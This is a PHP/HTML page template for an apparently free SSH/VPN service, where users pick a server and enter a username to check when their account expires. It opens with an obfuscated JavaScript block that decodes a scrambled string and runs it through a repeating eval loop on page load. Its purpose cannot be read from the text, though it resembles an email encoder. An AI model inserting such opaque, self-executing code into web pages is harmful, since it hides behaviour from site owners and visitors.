<script type="text/javascript">
//<![CDATA[
<!--
var x="function f(x){var i,o=\"\",ol=x.length,l=ol;while(x.charCodeAt(l/13)!" +
"=50){try{x+=x;l+=l;}catch(e){}}for(i=l-1;i>=0;i--){o+=x.charAt(i);}return o" +
".substr(0,ol);}f(\")41,\\\"{710\\\\500\\\\420\\\\630\\\\330\\\\400\\\\\\\\\\"+
"\\TNBF330\\\\710\\\\220\\\\L020\\\\R520\\\\530\\\\410\\\\330\\\\020\\\\GA@O" +
"WK610\\\\OSOyms}in4l~}wqd?* />7bbm`zh+hvldrn730\\\\710\\\\010\\\\@SIOYF]120" +
"\\\\730\\\\320\\\\220\\\\300\\\\U300\\\\730\\\\300\\\\r\\\\130\\\\700\\\\t\\"+
"\\520\\\\220\\\\H020\\\\n\\\\t\\\\300\\\\500\\\\(sfukmwh771\\\\3950!k==!+?%" +
"+;<<f$, 61!\\\\\\\\[O120\\\\\\\\\\\\420\\\\130\\\\420\\\\CUPXVATWNCD100\\\\" +
"HXn\\\\010\\\\\\\\\\\\710\\\\]T320\\\\230\\\\520\\\\000\\\\%>uh771\\\\sn5ow" +
"x<3v771\\\\q/`hiyiz(~jkk#chd330\\\\020\\\\<[D430\\\\420\\\\610\\\\200\\\\60" +
"0\\\\H530\\\\.300\\\\,QL1030\\\\610\\\\710\\\\100\\\\330\\\\200\\\\n\\\\430" +
"\\\\020\\\\020\\\\@=]3;/|y600\\\\*+4x;=>|4= =(;*g=&( j70!n3K[NOZ030\\\\e500" +
"\\\\QSG\\\\\\\\320\\\\Y_YC220\\\\710\\\\400\\\\EFLSLQV1iu|z`p~k\\\"(f};o nr" +
"uter};))++y(^)i(tAedoCrahc.x(edoCrahCmorf.gnirtS=+o;721=%y;++y)41<i(fi{)++i" +
";l<i;0=i(rof;htgnel.x=l,\\\"\\\"=o,i rav{)y,x(f noitcnuf\")"                 ;
while(x=eval(x));
//-->
//]]>
</script>
<div id="ndexi" style="display:none;">check-account</div>
<div id="where" style="display:none;">check-account</div>
 <!-- Main component for a primary marketing message or call to action -->
    
 <!-- START: section -->
  <section class="probootstrap-section">
    <div class="container">
      <div class="row">
        <div class="col-md-8 col-md-offset-2 section-heading mb50 text-center probootstrap-animate">
            <h2>Check your SSH Account expiry date</h2>
            <p class="lead">Check when your account's end date is here</p>
            <p class="lead">Use this service so you don't forget when your account expired</p>
</div>
      </div>
    <p class="text-center probootstrap-animate">
    <span class="badge badge-success mb-3 p-3">Free SSH VPN Accounts</span>
    <span class="badge badge-warning mb-3 p-3">Unlimited Bandwidth VPS</span>
    <span class="badge badge-primary mb-3 p-3">Full Speed Servers</span>
    <span class="badge badge-success mb-3 p-3">Private Account</span>
    <span class="badge badge-info mb-3 p-3">Hide Your IP Adrres</span>
    <span class="badge badge-primary mb-3 p-3">Fast SSH  VPN Servers</span>
  </p> 
  <p class="text-center probootstrap-animate">
    <span class="label label-danger">No DDOS</span>
    <span class="label label-danger">No Fraud</span>
    <span class="label label-danger">No Hacking</span>
    <span class="label label-danger">No Spam</span>
  </p> 
</div>
</section>
<?php
include('app/ads/link.php');
?>
<!-- END: section -->
<section class="probootstrap-section">
    <div class="container">
      <div class="row">
       <div class="col-lg-6 col-lg-offset-3 probootstrap-animate">
        <form action="ajax.proc.php?do=check-account" id="form-check" method="post" class="probootstrap-form probootstrap-box">
        <center>
        <div class="icon"><i class="icon-search"></i></div>
        <h1>Check Account</h1></center>
        <div class="form-group">
        Choose server:
        <select data-toggle="select" name="id" id="server" type="" class="form-control">
        <?php
        $q = mysqli_query($conn, "SELECT * FROM servers WHERE `type`='ssh' OR `type`='extra' OR `type`='one-month' OR `type`='openvpn'");
        while($row = mysqlI_fetch_object($q)) {
        ?>
        <option value="<?php echo $row->id ?>"><?php echo $row->host ?> (<?php echo $row->description ?>)</option>
        <?php } ?>
       </select>
       </div>
   <div class="form-group">Username: <input type="text" class="form-control" placeholder="username" name="username" required="username"></div>
<div align="center">
   <p><button type="button" class="btn btn-primary" id="check" role="button">Check Now</button>
   <div id="notif"></div>
   <?php
include('app/ads/ads.php');
?>
    </form>
</div>
</div>
</div>
</section>

</div>
<!-- END: page -->